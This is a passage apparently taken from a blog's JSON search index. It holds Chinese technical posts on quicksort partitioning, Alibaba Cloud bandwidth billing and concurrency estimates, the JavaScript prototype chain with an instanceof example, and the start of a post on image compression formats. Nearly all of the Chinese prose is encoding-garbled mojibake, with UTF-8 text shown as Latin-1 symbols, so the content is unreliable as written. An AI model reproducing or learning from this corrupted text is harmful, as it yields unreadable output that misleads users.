å³è¾¹çš„ >= 4 æ‰èµ°ï¼Œèµ°åˆ°ä¸‹æ ‡0ï¼Œmid = 4ï¼Œ å·¦è¾¹çš„ <= 4 æ‰èµ°ï¼Œä¸èµ°ï¼Œä¸‹æ ‡0ï¼ˆå·¦<å³ï¼‰ã€‚\n\n  äº¤æ¢åæ­£å¸¸ã€‚\n\n\n### 2.2 ä¸ºä»€ä¹ˆå¤§äºç­‰äºï¼Œè€Œä¸æ˜¯å¤§äº\n\nå¦‚æœå°±ä¸¤ä¸ªæ•°ï¼š 2ï¼Œ1ã€‚\n\n+ å¤§äºç­‰äºæ—¶\n\n  mid = 2ï¼Œ å³è¾¹çš„ >= 2 æ‰èµ°ï¼Œä¸åŠ¨ã€‚ å·¦è¾¹çš„ <= 2 æ‰èµ°ï¼Œä¼šèµ°åˆ°ä¸‹æ ‡ 1ã€‚ \n\n  åœ¨ä¸‹æ ‡ 1 ç›¸é‡åï¼Œå’Œå¼€å¤´äº¤æ¢ã€‚\n\n+ å¤§äºæ—¶\n\n  mid = 2ï¼Œ å³è¾¹çš„ > 2 æ‰èµ°ï¼Œä¸åŠ¨ã€‚å·¦è¾¹çš„ < 2 æ‰èµ°ï¼Œä¸åŠ¨ã€‚ \n\n  æ­»å¾ªç¯ã€‚\n\n\n\n# 3. å¤´è„‘é£æš´\n\n+ å…ˆå†™ä¸€ä¸ªåˆ†åŒºå‡½æ•°ï¼Œéœ€è¦è¿”å›indexï¼Œä¸Šå±‚æ ¹æ®è¿™ä¸ªindexé€’å½’è°ƒç”¨ã€‚\n+ ä¸€ä¸ªå¤§å¾ªç¯å¥—ä¸¤ä¸ªå°å¾ªç¯ï¼Œå³è¾¹æ¯”è¾ƒå…ˆèµ°ï¼Œå·¦è¾¹æ¯”è¾ƒå†èµ°ï¼Œç„¶åäº¤æ¢ã€‚\n+ ä¸¤ä¸ªç¢°åœ¨ä¸€èµ·ï¼Œå’Œé€‰çš„ä¸­é—´å€¼äº¤æ¢ï¼Œç„¶åè¿”å›indexå³å¯ã€‚\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://wiki.jikexueyuan.com/project/easy-learn-algorithm/fast-sort.html\n\n+ https://blog.csdn.net/qq_43990023/article/details/102297065\n\n","tags":["ç®—æ³•"],"categories":["ç®—æ³•"]},{"title":"äº‘æœåŠ¡å™¨å¸¦å®½ä»‹ç»","url":"%2Fp%2F13ebdb91.html","content":"\n\n\n# 1. äº‘æœåŠ¡å™¨å¸¦å®½\n\n### 1.1 è´­ä¹°çš„å¸¦å®½æ˜¯ä¸Šè¡Œè¿˜æ˜¯ä¸‹è¡Œï¼Ÿ\n\nç”¨æˆ·èŠ±é’±è´­ä¹°çš„å¸¦å®½æ˜¯æŒ‡äº‘æœåŠ¡å™¨ä¸Šè¡Œå¸¦å®½ï¼Œæ³¨æ„è¿™é‡ŒæŒ‡çš„ä¸Šè¡Œå¸¦å®½ä¸æ˜¯ä¸Šä¼ ï¼Œè€Œæ˜¯ä»äº‘æœåŠ¡å™¨ä¸‹è½½ä¸œè¥¿ã€‚\n\næŒ‡äº‘æœåŠ¡å™¨ä¸Šè¡Œå¸¦å®½ï¼Œ**å³äº‘æœåŠ¡å™¨å‡ºç½‘å¸¦å®½ï¼Œæµé‡æµå‡ºäº‘æœåŠ¡å™¨çš„æ–¹å‘ã€‚**\n\n<!-- more -->\n\né˜¿é‡Œäº‘æœåŠ¡å™¨åªæœ‰å…¬ç½‘å‡ºæ–¹å‘å¸¦å®½æ˜¯æ”¶è´¹çš„ï¼Œå…¬ç½‘å…¥æ–¹å‘å¸¦å®½æ˜¯å…è´¹çš„ã€‚\n\nå…³äºé˜¿é‡Œäº‘æœåŠ¡å™¨å¸¦å®½ä¸Šè¡Œã€ä¸‹è¡Œã€å‡ºç½‘åŠå…¥ç½‘å‚è€ƒä¸‹è¡¨ï¼š\n\n| å¸¦å®½ç±»åˆ«             | æ˜¯å¦æ”¶è´¹ | è¯´æ˜                                                         |\n| -------------------- | -------- | ------------------------------------------------------------ |\n| ä¸‹è¡Œå¸¦å®½ï¼ˆå…¥ç½‘å¸¦å®½ï¼‰ | å…è´¹     | æµå…¥äº‘æœåŠ¡å™¨ECSçš„å¸¦å®½ï¼Œä¾‹å¦‚ï¼šäº‘æœåŠ¡å™¨ECSä¸‹è½½å¤–éƒ¨ç½‘ç»œèµ„æºã€‚FTPå®¢æˆ·ç«¯ä¸Šä¼ èµ„æºåˆ°äº‘æœåŠ¡å™¨ECSã€‚ |\n| ä¸Šè¡Œå¸¦å®½ï¼ˆå‡ºç½‘å¸¦å®½ï¼‰ | æ”¶è´¹     | æµå‡ºäº‘æœåŠ¡å™¨ECSçš„å¸¦å®½ï¼Œä¾‹å¦‚ï¼šäº‘æœåŠ¡å™¨ECSå¯¹å¤–æä¾›è®¿é—®ã€‚FTPå®¢æˆ·ç«¯ä¸‹è½½äº‘æœåŠ¡å™¨ECSå†…éƒ¨èµ„æºã€‚ |\n\næ€»ç»“ä¸€ä¸‹ï¼Œç”¨æˆ·**èŠ±é’±è´­ä¹°çš„é˜¿é‡Œäº‘æœåŠ¡å™¨å…¬ç½‘å¸¦å®½æ˜¯æŒ‡ä¸Šè¡Œå¸¦å®½ï¼Œä¸Šè¡Œå¸¦å®½ä¹Ÿæ˜¯å‡ºç½‘å¸¦å®½ï¼Œæ˜¯æŒ‡æµé‡æµå‡ºäº‘æœåŠ¡å™¨æ–¹å‘çš„å¸¦å®½**ã€‚\n\n\n\n### 1.2 è´­ä¹°äº‘æœåŠ¡å™¨å¯ä»¥ä¸è¦å¸¦å®½å—ï¼Ÿ\n\nè´­ä¹°é˜¿é‡Œäº‘æœåŠ¡å™¨ECSå¯ä»¥ä¸è¦å…¬ç½‘å¸¦å®½ï¼Œå†…ç½‘å¸¦å®½æ˜¯å…è´¹çš„ï¼Œå¦‚æœä¸è¦å…¬ç½‘å¸¦å®½ä¹Ÿä¸ä¼šåˆ†é…ç‹¬ç«‹å…¬ç½‘IPåœ°å€ã€‚è´­ä¹°æ—¶ï¼Œä¸è¦å‹¾é€‰â€œåˆ†é…å…¬ç½‘ IPv4 åœ°å€â€ï¼Œåˆ™è¯¥å°äº‘æœåŠ¡å™¨å°±æ²¡æœ‰å…¬ç½‘å¸¦å®½ã€‚\n\næƒ³è¦ç‹¬ç«‹å…¬ç½‘IPåœ°å€ï¼Œä½†æ˜¯å¸¦å®½å€¼æƒ³é€‰æ‹©0ï¼Œè¿™æ˜¯ä¸è¡Œçš„ï¼Œå‹¾é€‰å…¬ç½‘IPåï¼Œå¸¦å®½å€¼è‡³å°‘é€‰æ‹©1Mã€‚\n\n\n\n+ ä¸è¦å…¬ç½‘å¸¦å®½ï¼Œå¯¹äº‘æœåŠ¡å™¨æœ‰ä»€ä¹ˆå½±å“ï¼Ÿ\n\n  å½±å“å°±æ˜¯äº‘æœåŠ¡å™¨ä¸èƒ½åœ¨å…¬ç½‘è®¿é—®ï¼Œä¹Ÿä¸èƒ½å¯¹å¤–æä¾›æœåŠ¡ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ çš„äº‘æœåŠ¡å™¨ä½œä¸ºWebæœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰˜ç®¡äº†ç½‘ç«™ï¼Œé‚£ä¹ˆè®¿å®¢æ— æ³•é€šè¿‡å…¬ç½‘æ¥è®¿é—®ä½ çš„æœåŠ¡å™¨ã€‚\n\n\n\n### 1.3 1Må¸¦å®½å‡ºç½‘é€Ÿåº¦\n\né˜¿é‡Œäº‘æœåŠ¡å™¨1Må¸¦å®½ä¸‹è½½é€Ÿåº¦æ˜¯128KB/Sï¼Œä¸ºä»€ä¹ˆä¸æ˜¯1M/Sï¼Ÿ\n\nè¿™æ˜¯ç”±äºIDCäº‘å‚å•†å¸¦å®½å¤šå°‘æ˜¯é’ˆå¯¹bitï¼ˆæ¯”ç‰¹ï¼‰æ¥è®¡ç®—çš„ï¼Œè€Œç”¨æˆ·å®é™…ä¸‹è½½æ˜¯æ ¹æ®Byteï¼ˆå­—èŠ‚ï¼‰æ¥è®¡ç®—çš„ï¼Œ8bit = 1Byteï¼Œæ‰€ä»¥IDCäº‘å‚å•†æä¾›çš„å¸¦å®½å’Œå®é™…ä¸‹è½½é€Ÿåº¦ä¹‹é—´æœ‰ä¸ª8å€çš„å…³ç³»ï¼Œæ‰€ä»¥äº‘æœåŠ¡å™¨å…¬ç½‘å¸¦å®½å®é™…ä¸‹è½½é€Ÿåº¦è¦é™¤ä»¥8ã€‚\n\n\n\n### 1.4 1Må¸¦å®½æœåŠ¡å™¨å¯ä»¥æ”¯æ’‘å¤šå°‘äººåŒæ—¶åœ¨çº¿\n\n+ æœåŠ¡å™¨1Må¸¦å®½å¹¶å‘æ•°è®¡ç®—\n\n  æœåŠ¡å™¨1Må¸¦å®½çš„ä¸‹è½½é€Ÿåº¦æ˜¯128KB/Sï¼Œä¸æ˜¯1M/ç§’ã€‚ç½‘ç«™ç±»å‹ä¸åŒç½‘é¡µå¤§å°ä¹Ÿä¸åŒï¼Œå¦‚ï¼šå°è¯´ç«™å’Œå›¾ç‰‡ç«™æ˜¯æ²¡æœ‰å¯æ¯”æ€§çš„ï¼ŒæœåŠ¡å™¨å¸¦å®½ç½‘å‡è®¾ç½‘é¡µä¼˜åŒ–åçš„å¤§å°ä¸º30KBï¼›\n\n  é‚£ä¹ˆï¼Œ1Må¸¦å®½å¯æ”¯æ’‘4ä¸ªç”¨æˆ·åœ¨1ç§’å†…åŒæ—¶æ‰“å¡ç½‘é¡µï¼Œæ‰€ä»¥ï¼Œ1Må¸¦å®½1ç§’å†…çš„å¹¶å‘æ•°ä¸º4ã€‚\n\n\n\n+ ç½‘ç«™8ç§’åŸåˆ™\n\n  ç”¨æˆ·ç­‰å¾…ç½‘ç«™æ‰“å¼€æ—¶é—´å¦‚æœè¶…è¿‡8ç§’ï¼Œå°±ä¼šä¸è€çƒ¦ç»§è€Œå…³é—­ç½‘ç«™ï¼Œå¦‚æœå°†ç½‘é¡µæ‰“å¼€æ—¶é—´ç¨å¾®å»¶é•¿ï¼Œå¹¶å‘æ•°å¯ä»¥å†å»¶é•¿ä¸€äº›ã€‚æ¯”å¦‚ï¼Œ1Må¸¦å®½å¯æ”¯æ’‘8ä¸ªç”¨æˆ·åœ¨2ç§’å†…åŒæ—¶æ‰“å¼€ç½‘é¡µï¼Œä»¥æ­¤ç±»æ¨ã€‚ä½†æ˜¯éšç€ç½‘ç»œé€Ÿåº¦çš„æå‡ï¼Œç”¨æˆ·å¯¹ç½‘é¡µæ‰“å¼€é€Ÿåº¦è¶Šæ¥è¶ŠæŒ‘å‰”ï¼Œä¸ç”¨ç­‰åˆ°8ç§’ï¼Œ5ç§’é’Ÿæ‰“ä¸å¼€å¯èƒ½å°±æ”¾å¼ƒäº†ã€‚\n\n  \n\næœåŠ¡å™¨å¸¦å®½ç½‘ä»¥1Må¸¦å®½1ç§’å¹¶å‘æ•°4æ¥è®¡ç®—ï¼Œä¸€å¤©86400ç§’ï¼Œä¸€å¤©å¯æ”¯æ’‘34ä¸‡IPï¼Œå“ˆå“ˆï¼Œè¿™ä¸æ˜¯æ‰¯æ·¡ä¹ˆï¼Œç”¨æˆ·ä¸ä¼šè¿™ä¹ˆå‡åŒ€åœ°è®¿é—®ç½‘ç«™ï¼Œç½‘ç«™ä¸€å¤©è®¿é—®é‡é«˜å³°é›†ä¸­åœ¨ä¸Šåˆ9ç‚¹åˆ°11ç‚¹ã€ä¸‹åˆ3ç‚¹åˆ°5ç‚¹å’Œæ™šä¸Š8ç‚¹åˆ°10ç‚¹ï¼Œè¿™ä¸ªæ—¶é—´æ®µå¹¶å‘æ•°4ä¹Ÿæ˜¯ä¸å°çš„è®¿é—®é‡ã€‚\n\n\n\né˜¿é‡Œäº‘æœåŠ¡å™¨1Må¸¦å®½æ”¯æŒå¤šå°‘äººåœ¨çº¿ï¼Ÿæ—¥å‡2000IPçš„å°ç½‘ç«™ä¸æˆé—®é¢˜ã€‚å½“ç„¶ç½‘ç«™å›¾ç‰‡åª’ä½“æ–‡ä»¶æœ€å¥½æ¥å…¥CDNã€‚\n\nå›¾ç‰‡æˆ–è€…ä¸€äº›åª’ä½“æ–‡ä»¶å¯ä»¥æ‰˜ç®¡åˆ°OSSï¼Œè€Œä¸”å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ç½‘ç«™åï¼Œåœ¨æµè§ˆå…¶ä»–é¡µé¢ï¼Œæˆ–è€…è¿›è¡ŒäºŒæ¬¡è®¿é—®ï¼Œæµè§ˆå™¨ä¼šä¼˜å…ˆåŠ è½½æœ¬æœºç¼“å­˜ï¼Œå¹¶ä¸æ˜¯ç”¨æˆ·æ¯æ¬¡æµè§ˆPVéƒ½è¦å ç”¨é¦–æ¬¡å¸¦å®½ã€‚\n\n\n\n### 1.5 äº‘æœåŠ¡å™¨å¸¦å®½å³°å€¼\n\né˜¿é‡Œäº‘æœåŠ¡å™¨å¸¦å®½æœ€å¤§å¯é€‰200Mbpsï¼Œè¯¦ç»†å‚è€ƒä¸‹è¡¨ï¼š\n\n|              é™åˆ¶é¡¹              |                         æ™®é€šç”¨æˆ·é™åˆ¶                         |\n| :------------------------------: | :----------------------------------------------------------: |\n|         å…¥å¸¦å®½å³°å€¼(å…è´¹)         | å½“æ‰€è´­å‡ºå¸¦å®½å³°å€¼å°äºç­‰äº10 Mbit/sæ—¶ï¼Œé˜¿é‡Œäº‘ä¼šåˆ†é…10 Mbit/så…¥æ–¹å‘å¸¦å®½ã€‚<br/>å½“æ‰€è´­å‡ºå¸¦å®½å³°å€¼å¤§äº10 Mbit/sæ—¶ï¼Œé˜¿é‡Œäº‘ä¼šåˆ†é…ä¸è´­ä¹°çš„å‡ºå¸¦å®½å³°å€¼ç›¸ç­‰çš„å…¥æ–¹å‘å¸¦å®½ã€‚ |\n|         å‡ºå¸¦å®½å³°å€¼(æ”¶è´¹)         | æŒ‰ä½¿ç”¨æµé‡è®¡è´¹ï¼š100 Mbit/s<br/>æŒ‰å›ºå®šå¸¦å®½è®¡è´¹ï¼šåŒ…å¹´åŒ…æœˆå®ä¾‹ï¼š200 Mbit/s  æŒ‰é‡ä»˜è´¹å®ä¾‹ï¼š100 Mbit/s |\n| å•å®ä¾‹æ›´æ¢åˆ†é…çš„å…¬ç½‘IPåœ°å€çš„é™åˆ¶ | æ–°å»ºå®ä¾‹å…­å°æ—¶å†…å¯ä»¥æ›´æ¢å…¬ç½‘IPåœ°å€ï¼Œä¸€å°å®ä¾‹æœ€å¤šå¯ä»¥æ›´æ¢ä¸‰æ¬¡ã€‚ |\n\n\n\n### 1.6 æœåŠ¡å™¨å¸¦å®½é€‰å¤šå°‘åˆé€‚ï¼Ÿ\n\næœåŠ¡å™¨å¸¦å®½é€‰æ‹©æ˜¯æ²¡æœ‰æ ‡å‡†çš„ï¼Œç”¨æˆ·å®é™…çš„ä½¿ç”¨åœºæ™¯ä¸åŒå¸¦å®½å€¼è‡ªç„¶ä¸åŒï¼Œä¾‹å¦‚ç”µå½±ç›´æ’­ä¸‹è½½ç±»çš„åº”ç”¨å°±å¾ˆå å¸¦å®½ï¼Œä¸€æ–¹é¢éœ€è¦é«˜å¸¦å®½ï¼Œä¸€æ–¹é¢å¯ä»¥è€ƒè™‘åˆ°ä½¿ç”¨OSSã€CDNç­‰äº§å“æ¥é™ä½å¸¦å®½æˆæœ¬ã€‚\n\n\n\nä¸‹è½½ç±»/ç›´æ’­ç±»çš„ç½‘ç«™å¯¹æœåŠ¡å™¨å¸¦å®½è¦æ±‚é«˜ï¼Œå…·ä½“é€‰æ‹©å¤šå°‘å¸¦å®½è¿˜æ˜¯è¦æ ¹æ®ç½‘ç«™å®é™…ç”¨æˆ·è§„æ¨¡ã€åŒæ—¶ä¸‹è½½äººæ•°ç­‰ï¼›æœåŠ¡å™¨å¸¦å®½ç½‘ä»¥é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸ºä¾‹ï¼Œä¸€èˆ¬å»ºè®®ç”¨æˆ·ä¸è¦å…¨éƒ¨ä¾èµ–å¸¦å®½ï¼Œå¯ä»¥å°†æ–‡ä»¶å­˜å‚¨åˆ°æˆæœ¬æ›´åŠ å»‰ä»·çš„ OSS ä¸Šï¼Œç„¶åå°†ç½‘ç«™æ¥å…¥ CDN å‡å°‘å¯¹æœåŠ¡å™¨èµ„æºåŠå¸¦å®½çš„å ç”¨ï¼Œå¯ä»¥è¿›ä¸€æ­¥é™ä½å¸¦å®½æˆæœ¬ã€‚\n\n\n\nå¦‚æœæ˜¯é˜¿é‡Œäº‘æœåŠ¡å™¨é€‰æ‹©å¸¦å®½ï¼ŒæœåŠ¡å™¨å¸¦å®½ç½‘å»ºè®®ç”¨æˆ·åœ¨åº”ç”¨å…è®¸çš„æƒ…å†µä¸‹ï¼Œå°½é‡å°†å¸¦å®½å€¼æ§åˆ¶åœ¨5MåŠ5Mä»¥ä¸Šï¼Œå¯ä»¥æ­é…é˜¿é‡Œäº‘OSS å’ŒCDN ç­‰äº§å“ï¼Œæ¥é™ä½å…¬ç½‘å¸¦å®½çš„å ç”¨ï¼Œæ¯•ç«ŸæœåŠ¡å™¨å¸¦å®½çš„æˆæœ¬è¿˜æ˜¯æŒºé«˜çš„ã€‚\n\n\n\n# 2. å‚è€ƒèµ„æ–™\n\n+ http://fuwuqidaikuan.com/","tags":["äº‘æœåŠ¡å™¨"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"javascriptåŸé“¾çš„è‡ªæˆ‘ç†è§£","url":"%2Fp%2F6d00c950.html","content":"\n### Object å’Œ Function\n\né¦–å…ˆåœ¨ javascript ä¸­ æˆ‘ä»¬è¦æ˜ç¡®Object å’Œ Functionä¸¤ä¸ªæ¦‚å¿µ:\n\n+ ä¸‡ç‰©çš†å¯¹è±¡\n\n+ æ‰€æœ‰å¯¹è±¡éƒ½æ˜¯å‡½æ•°åˆ›å»ºå‡ºæ¥\n\nä»”ç»†ç¢ç£¨è¿™ä¸¤å¥è¯, å…¶å®è¯´çš„ Object å’Œ Function æ˜¯ä¸€ä¸ªé¸¡ç”Ÿè›‹è¿˜æ˜¯è›‹ç”Ÿé¸¡çš„é—®é¢˜. ä¸ºä»€ä¹ˆè¿™ä¹ˆè®²å‘¢? å› ä¸ºå‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡, ä½†å¯¹è±¡åˆæ˜¯å‡½æ•°åˆ›å»ºå‡ºæ¥çš„. \n\n å…¶å®åŸå‹é“¾çš„ä¸€åˆ‡æ±Ÿæ¹–æ©æ€¨éƒ½æ˜¯å›´ç»•ç€Functionå’ŒObjectä¸¤å¤§å®¶æ—å±•å¼€çš„.\n\n\n\n<!-- more -->\n\n### é¸¡å®¶æ—å’Œè›‹å®¶æ—\n\n+ æœ‰åˆ›é€ åŠ›çš„å‡½æ•°æˆ‘ä»¬ç§°ä¸ºFunctioné¸¡å®¶æ—, æ²¡æœ‰åˆ›é€ åŠ›çš„å¯¹è±¡æˆ‘ä»¬ç§°ä¸ºObjectè›‹å®¶æ—\n\n+ èŠ¸èŠ¸ä¼—ç”Ÿ,ä½ æˆ‘å¥¹éƒ½æ˜¯ä¸€ä¸ªè›‹å¯¹è±¡(~~). æˆ‘ä»¬éƒ½æ˜¯è¢«æŸä¸€ä¸ªå‡½æ•°åˆ›å»ºå‡ºæ¥, æˆ‘ä»¬å¯ä»¥ç§°ä¸ºåˆ›å»ºæˆ‘ä»¬çš„è¿™ä¸ªå‡½æ•°ä¸ºé¸¡çˆ¸çˆ¸, æˆ‘ä»¬æ¯äººéƒ½æœ‰ä¸€ä¸ªé¸¡çˆ¸çˆ¸\n\n+ æ³¨æ„åˆ›å»ºæˆ‘ä»¬çš„é¸¡çˆ¸çˆ¸å‡½æ•°, ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡. å®ƒæ›¾ç»ä¹Ÿæ˜¯è¢«æŸä¸€ä¸ªå‡½æ•°åˆ›å»ºå‡ºæ¥çš„\n\n\n\n### prototypeé¸¡æŠ€èƒ½ä»“åº“\n\n+ prototype æ˜¯ Functioné¸¡å®¶æ—ç‹¬æœ‰çš„æŠ€èƒ½ä»“åº“, æ²¡æœ‰åˆ›é€ èƒ½åŠ›çš„è›‹å®¶æ—æ²¡æœ‰è¿™ä¸ªä»“åº“.\n\n+ é¸¡æŠ€èƒ½ä»“åº“å†…æ”¾ç€é¸¡çˆ¸çˆ¸çš„å±æ€§å’Œå‡½æ•°ç­‰æŠ€èƒ½. ä¾‹å¦‚åƒå°ç±³ã€æ‰è™«å­ã€å˜å‡¤å‡°...\n\n+ æ³¨æ„é¸¡æŠ€èƒ½ä»“åº“å±äº Objectè›‹å®¶æ—,  å› ä¸ºé¸¡æŠ€èƒ½ä»“åº“æ²¡æœ‰åˆ›é€ èƒ½åŠ›, é¸¡æ‰æœ‰åˆ›é€ åŠ›\n\n\n\nOK, åˆ›å»ºæˆ‘ä»¬çš„é¸¡çˆ¸çˆ¸å®ƒæ‹¥æœ‰ prototype å±æ€§.  æ„å‘³ç€æ¯ä¸ªé¸¡éƒ½æ‹¥æœ‰ä¸€ä¸ªæŠ€èƒ½ä»“åº“, ä»“åº“çš„å¤§é—¨ä¸Šä¹Ÿå†™ç€æ‹¥æœ‰è€…åå­—(constructorå±æ€§), å³è¿™ä¸ªé¸¡æœ¬äººçš„åå­—\n\n+ prototype æ˜¯é¸¡çš„å±æ€§, è€Œconstructoræ˜¯é¸¡æŠ€èƒ½ä»“åº“çš„å±æ€§\n\n  \n\n###  \\__proto\\__ æ‹¥æœ‰é¸¡çˆ¸çˆ¸æŠ€èƒ½ä»“åº“çš„é’¥åŒ™\n\n\n\n+ \\__proto\\__ æ˜¯ä¸€ä¸ªéšè—çš„æŒ‡é’ˆ, ä¸‡ç‰©çš†æœ‰è¿™ä¸ªæŒ‡é’ˆ. æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ª \\__proto\\__ ç†è§£ä¸º æˆ‘æ‹¿ç€ä¸€æŠŠæˆ‘é¸¡çˆ¸çˆ¸æŠ€èƒ½ä»“åº“çš„é’¥åŒ™\n\n+ æˆ‘æ‹¿äº†ä¸€æŠŠé¸¡çˆ¸çˆ¸æŠ€èƒ½ä»“åº“é’¥åŒ™, æ„å‘³ç€æˆ‘å¯ä»¥ä½¿ç”¨é¸¡çˆ¸çˆ¸æŠ€èƒ½ä»“åº“çš„æŠ€èƒ½,  ä¾‹å¦‚åƒå°ç±³ã€æ‰è™«å­ã€å˜å‡¤å‡°...\n\n\n\né‚£ä¹ˆé¸¡çš„ \\__proto\\__ æŒ‡å‘è°? é¸¡æŠ€èƒ½ä»“åº“çš„  \\__proto\\__ åˆæŒ‡å‘è°?\n\n+ åˆ›å»ºé¸¡(å‡½æ•°å®¶æ—)çš„é¸¡çˆ¸çˆ¸ æ˜¯function Function(),  æ‰€ä»¥é¸¡çš„  \\__proto\\__ æŒ‡å‘ Function.prototype\n\n+ åˆ›å»ºé¸¡ä»“åº“(å¯¹è±¡å®¶æ—)çš„é¸¡çˆ¸çˆ¸æ˜¯function  Object(), æ‰€ä»¥é¸¡ä»“åº“çš„  \\__proto\\__ æŒ‡å‘ Object.prototype\n\n+ æœ€å Object. \\__proto\\__æŒ‡å‘äº† null\n\n\n\nOK, å¦‚æœæˆ‘è°ƒç”¨ä¸€ä¸ªå‡½æ•°, é‚£ä¹ˆå…ˆåœ¨æˆ‘èº«ä¸Šæ‰¾è¿™ä¸ªå‡½æ•°. \n\nå¦‚æœæ²¡æ‰¾åˆ°, å°±æ‹¿èµ·æˆ‘çš„é’¥åŒ™å»æˆ‘é¸¡çˆ¸çˆ¸çš„æŠ€èƒ½ä»“åº“å»æ‰¾.\n\nå¦‚æœè¿˜æ²¡æ‰¾åˆ°, å°±æ‹¿èµ·æŠ€èƒ½ä»“åº“å¯¹è±¡çš„é’¥åŒ™, å»ä»“åº“å¯¹è±¡é¸¡çˆ¸çˆ¸çš„æŠ€èƒ½ä»“åº“å»æ‰¾, ä¸€ç›´æ‰¾åˆ° nullä¸ºæ­¢.\n\n\n\n### åˆ†æä¸€å¼ å›¾\n\n![img](javascriptåŸå‹é“¾çš„è‡ªæˆ‘ç†è§£/1.png)\n\n\n\nä¸Šé¢éƒ¨åˆ†:\n\n+ f1 = new Foo()  æˆ‘æ˜¯f1, æ²¡æœ‰prototypeä»“åº“,  æˆ‘çš„  \\__proto\\__ æŒ‡å‘äº†é¸¡çˆ¸çˆ¸çš„ä»“åº“ Foo.prototype\n+ é¸¡çˆ¸çˆ¸(Function Foo)çš„æŠ€èƒ½ä»“åº“(prototype)æ˜¯ Foo.prototype, ä»“åº“çš„åå­—(constructor)æ˜¯ function Foo()\n\n+ é¸¡æŠ€èƒ½ä»“åº“Foo.prototypeçš„ \\__proto\\__ æŒ‡å‘äº† Object.prototype,  Object.prototypeçš„  \\__proto\\__ æŒ‡å‘äº† null (å‰é¢å·²ç»æè¿‡)\n\nå·¦ä¾§éƒ¨åˆ†:\n\n+ function Fooçš„é¸¡çˆ¸çˆ¸æ˜¯ function Function(), å› ä¸ºæ˜¯è¿™ä¸ªå‡½æ•°åˆ›å»ºäº†é¸¡çˆ¸çˆ¸, æ‰€ä»¥ Function Fooçš„ \\__proto\\__æŒ‡å‘äº† Function.prototype ä»“åº“\n+ å†çœ‹function Function()  å®ƒçš„æŠ€èƒ½ä»“åº“æ˜¯ Function.prototype, æŠ€èƒ½ä»“åº“åå­—æ˜¯ function Function() .  å¦å¤–è¿‡åˆ†çš„æ˜¯function Function() æ˜¯è¢«å®ƒè‡ªå·±function Function()åˆ›å»ºå‡ºæ¥çš„, æ‰€ä»¥å®ƒçš„ \\__proto\\__æŒ‡å‘äº†è‡ªå·±çš„æŠ€èƒ½ä»“åº“\n\nä¸­é—´éƒ¨åˆ†: \n+ function Objectçš„  \\__proto\\__  æŒ‡å‘äº†Function.prototype çœ‹æ¥æ‰€æœ‰é¸¡çš„é’¥åŒ™éƒ½æŒ‡å‘äº†Function.prototype\n+ æŠ€èƒ½ä»“åº“Function.prototypeçš„ \\__proto\\__ æŒ‡å‘äº† Object.prototype,  Object.prototypeçš„  \\__proto\\__ æŒ‡å‘äº† null \n\n\n\n### instanceof å¯»ä»“åº“è¿ç®—ç¬¦\n\ninstanceofè¿ç®—ç¬¦çš„ç¬¬ä¸€ä¸ªå˜é‡æ˜¯ä¸€ä¸ªå¯¹è±¡(è›‹å®¶æ—)ï¼Œæš‚æ—¶ç§°ä¸ºAï¼›ç¬¬äºŒä¸ªå˜é‡ä¸€èˆ¬æ˜¯ä¸€ä¸ªå‡½æ•°(é¸¡å®¶æ—)ï¼Œæš‚æ—¶ç§°ä¸ºBã€‚\n\nInstanceofçš„åˆ¤æ–­é˜Ÿåˆ™æ˜¯ï¼šæ²¿ç€Açš„ \\__proto\\__ è¿™æ¡çº¿æ¥æ‰¾ï¼ŒåŒæ—¶æ²¿ç€Bçš„prototypeè¿™æ¡çº¿æ¥æ‰¾ï¼Œå¦‚æœä¸¤æ¡çº¿èƒ½æ‰¾åˆ°åŒä¸€ä¸ªå¼•ç”¨ï¼Œå³åŒä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆå°±è¿”å›trueã€‚å¦‚æœæ‰¾åˆ°ç»ˆç‚¹è¿˜æœªé‡åˆï¼Œåˆ™è¿”å›falseã€‚\n\n\n\n```javascript\nconsole.log(Object instanceof Function); //true\nconsole.log(Function instanceof Object); //true\nconsole.log(Function instanceof Function); //true\n```\n\n\n\n","tags":["javascript"],"categories":["javascript"]},{"title":"å¸¸è§å›¾ç‰‡æ ¼å¼","url":"%2Fp%2F7ca2c4cd.html","content":"\n# 1. å‰è¨€\n\n#### 1.1 æœ‰æŸvsæ— æŸ\n\nå›¾ç‰‡æ–‡ä»¶æ ¼å¼æœ‰å¯èƒ½ä¼šå¯¹å›¾ç‰‡çš„æ–‡ä»¶å¤§å°è¿›è¡Œä¸åŒç¨‹åº¦çš„å‹ç¼©ï¼Œå›¾ç‰‡çš„å‹ç¼©åˆ†ä¸ºæœ‰æŸå‹ç¼©å’Œæ— æŸå‹ç¼©ä¸¤ç§ã€‚\n\n- æœ‰æŸå‹ç¼©ã€‚æŒ‡åœ¨å‹ç¼©æ–‡ä»¶å¤§å°çš„è¿‡ç¨‹ä¸­ï¼ŒæŸå¤±äº†ä¸€éƒ¨åˆ†å›¾ç‰‡çš„ä¿¡æ¯ï¼Œä¹Ÿå³é™ä½äº†å›¾ç‰‡çš„è´¨é‡ï¼Œå¹¶ä¸”è¿™ç§æŸå¤±æ˜¯ä¸å¯é€†çš„ï¼Œæˆ‘ä»¬ä¸å¯èƒ½ä»æœ‰ä¸€ä¸ªæœ‰æŸå‹ç¼©è¿‡çš„å›¾ç‰‡ä¸­æ¢å¤å‡ºå…¨æ¥çš„å›¾ç‰‡ã€‚å¸¸è§çš„æœ‰æŸå‹ç¼©æ‰‹æ®µï¼Œæ˜¯æŒ‰ç…§ä¸€å®šçš„ç®—æ³•å°†ä¸´è¿‘çš„åƒç´ ç‚¹è¿›è¡Œåˆå¹¶ã€‚\n- æ— æŸå‹ç¼©ã€‚åªåœ¨å‹ç¼©æ–‡ä»¶å¤§å°çš„è¿‡ç¨‹ä¸­ï¼Œå›¾ç‰‡çš„è´¨é‡æ²¡æœ‰ä»»ä½•æŸè€—ã€‚æˆ‘ä»¬ä»»ä½•æ—¶å€™éƒ½å¯ä»¥ä»æ— 